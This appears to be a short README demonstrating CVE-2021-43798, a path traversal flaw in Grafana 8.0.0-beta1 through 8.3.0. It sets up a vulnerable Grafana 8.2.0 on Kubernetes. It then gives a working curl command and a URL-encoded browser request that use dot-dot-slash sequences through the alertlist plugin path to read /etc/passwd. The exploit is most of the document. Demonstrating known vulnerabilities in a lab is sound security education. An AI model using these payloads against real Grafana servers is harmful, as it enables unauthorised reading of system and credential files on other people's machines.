# CVE-2021-43798 - Grafana Path Traversal Vulnerability

Grafana versions `8.0.0-beta1` through `8.3.0` are vulnerable to directory traversal. A path traversal attack aims to access files and directories that are stored outside the web root folder by manipulating variables that reference files with **dot-dot-slash** attack.

## Demo - Path Traversal attack 

- install grafana on K8s

```
kubectl create deployment grafana --image=docker.io/grafana/grafana:8.2.0
kubectl expose deployment grafana --port=3001 --target-port=3000 --protocol=TCP 
```

- Simulating 

- crafting an HTTP request to read user account information
```
curl --path-as-is http://localhost:3001/public/plugins/alertlist/../../../../../../../../etc/passwd
```

- by browser
```
http://localhost:3001/public/plugins/alertlist/..%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd 
```